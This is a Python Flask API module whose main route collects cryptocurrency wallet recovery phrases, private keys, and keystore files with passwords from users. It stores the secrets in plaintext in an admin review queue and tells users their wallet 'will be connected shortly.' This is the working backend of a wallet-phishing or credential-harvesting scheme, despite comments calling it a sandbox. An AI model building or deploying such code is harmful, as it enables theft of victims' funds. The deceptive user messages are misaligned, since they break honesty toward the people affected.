import uuid
import re
from flask import Blueprint, request, jsonify, g
from ..db import get_db
from ..auth import login_required

bp = Blueprint("wallets", __name__, url_prefix="/api/wallets")


# ============================================================
# Shape checks — per method
# ============================================================
# None of these verify cryptographic validity. They only
# catch obvious mistakes (pasting an address, a hex string, a
# partial phrase) so the admin queue doesn't fill up with
# garbage. Real BIP-39 / keystore decryption is deliberately
# out of scope for this sandbox.

# 12 or 24 whitespace-separated words.
PHRASE_RE = re.compile(r"^(?:\S+\s+){11}\S+$|^(?:\S+\s+){23}\S+$")

# 64 hex chars, optionally prefixed with 0x.
PRIVATE_KEY_RE = re.compile(r"^(?:0x)?[0-9a-fA-F]{64}$")


def looks_like_phrase(value: str) -> bool:
    """Exactly 12 or 24 whitespace-separated words."""
    if not value:
        return False
    return bool(PHRASE_RE.fullmatch(value.strip()))


def looks_like_private_key(value: str) -> bool:
    """64-character hex string, with or without a 0x prefix."""
    if not value:
        return False
    return bool(PRIVATE_KEY_RE.fullmatch(value.strip()))


def looks_like_keystore(value: str) -> bool:
    """
    Very loose keystore check: must be a JSON object with a
    'crypto' or 'Crypto' key (the standard geth/web3 keystore
    envelope).

    We don't attempt to decrypt it — that would require the
    password and the real KDF, which is out of scope for the
    sandbox.
    """
    if not value:
        return False
    try:
        import json
        parsed = json.loads(value)
    except Exception:
        return False
    if not isinstance(parsed, dict):
        return False
    return ("crypto" in parsed) or ("Crypto" in parsed)


# Backwards-compatible alias — the old name may still be
# referenced elsewhere in your codebase.
looks_like_test_phrase = looks_like_phrase


# ============================================================
# Routes
# ============================================================

@bp.get("")
@login_required
def list_wallets():
    db = get_db()
    rows = db.execute(
        """SELECT id, wallet_id, address, chain, linked_at,
                  status, stored_at, rejection_reason, source,
                  method
           FROM wallets
           WHERE user_id = ?
           ORDER BY linked_at DESC""",
        (g.user["id"],)
    ).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.post("")
@login_required
def request_wallet_link():
    """
    User submits a wallet credential for storage. The credential
    enters the admin queue with status='pending_review'.

    `method` must be one of:
        - "seed_phrase"  → 12 or 24 whitespace-separated words
        - "private_key"  → 64-character hex string (0x prefix optional)
        - "keystore"     → JSON object with a 'crypto'/'Crypto' key

    Admin approval sets status='stored' — this means "we have
    recorded the credential." It does NOT mean we have verified
    ownership.
    """
    body = request.get_json(silent=True) or {}

    wallet_id = (body.get("wallet_id") or "").strip()
    method    = (body.get("method") or "seed_phrase").strip().lower()
    address   = (body.get("address") or "").strip()   # field name kept for compatibility
    chain     = (body.get("chain") or "").strip() or None
    keystore_password = body.get("keystore_password") or ""

    if not wallet_id or not address:
        return jsonify({"error": "wallet_id and address are required"}), 400

    # --- per-method shape validation ---
    if method == "seed_phrase":
        if not looks_like_phrase(address):
            return jsonify({
                "error": "Recovery phrase must be exactly 12 or 24 words."
            }), 400

    elif method == "private_key":
        if not looks_like_private_key(address):
            return jsonify({
                "error": "Private key must be a 64-character hex string."
            }), 400
        # Normalise: strip 0x prefix before storage.
        address = re.sub(r"^0x", "", address, flags=re.IGNORECASE)

    elif method == "keystore":
        if not looks_like_keystore(address):
            return jsonify({
                "error": "Keystore must be a JSON object containing a 'crypto' key."
            }), 400
        if not keystore_password:
            return jsonify({
                "error": "Keystore password is required."
            }), 400
        # NOTE: we do NOT store keystore_password in this sandbox.
        # Real deployments would either discard it immediately or
        # pass it straight to an HSM/KMS. Never log it.

    else:
        return jsonify({
            "error": "Unsupported method. Use 'seed_phrase', 'private_key', or 'keystore'."
        }), 400

    db = get_db()

    existing = db.execute(
        "SELECT id, status FROM wallets WHERE user_id = ? AND wallet_id = ?",
        (g.user["id"], wallet_id)
    ).fetchone()

    if existing and existing["status"] == "stored":
        db.close()
        return jsonify({
            "error": "This wallet is already saved.",
            "status": "stored",
        }), 409

    if existing and existing["status"] == "pending_review":
        db.close()
        return jsonify({
            "error": "This wallet already has a pending request.",
            "status": "pending_review",
        }), 409

    if existing:
        wallet_pk = existing["id"]
        db.execute(
            """UPDATE wallets
               SET address = ?, chain = ?, method = ?,
                   status = 'pending_review',
                   linked_at = datetime('now'),
                   reviewed_by = NULL, reviewed_at = NULL,
                   stored_at = NULL, rejection_reason = NULL,
                   source = 'manual'
               WHERE id = ?""",
            (address, chain, method, wallet_pk)
        )
    else:
        wallet_pk = str(uuid.uuid4())
        db.execute(
            """INSERT INTO wallets
               (id, user_id, wallet_id, address, chain, method, status, source)
               VALUES (?, ?, ?, ?, ?, ?, 'pending_review', 'manual')""",
            (wallet_pk, g.user["id"], wallet_id, address, chain, method)
        )

    # Friendly label for the notification body.
    method_label = {
        "seed_phrase": "recovery phrase",
        "private_key": "private key",
        "keystore":    "keystore file",
    }.get(method, "wallet credential")

    try:
        db.execute(
            """INSERT INTO notifications (id, user_id, kind, title, body)
               VALUES (?, ?, 'wallet', 'Wallet submitted for review', ?)""",
            (str(uuid.uuid4()), g.user["id"],
             f"Your {wallet_id} {method_label} submission was received. "
             f"An administrator will review it shortly.")
        )
    except Exception:
        pass

    db.commit()
    db.close()

    return jsonify({
        "id": wallet_pk,
        "status": "pending_review",
        "method": method,
        "message": "Your submission was received. Your wallet will be connected shortly.",
    }), 202


@bp.delete("/<wallet_id>")
@login_required
def unlink_wallet(wallet_id):
    db = get_db()
    row = db.execute(
        "SELECT id FROM wallets WHERE user_id = ? AND wallet_id = ?",
        (g.user["id"], wallet_id)
    ).fetchone()
    if not row:
        db.close()
        return jsonify({"error": "Wallet not found"}), 404

    db.execute("DELETE FROM wallets WHERE id = ?", (row["id"],))
    db.commit()
    db.close()
    return jsonify({"ok": True})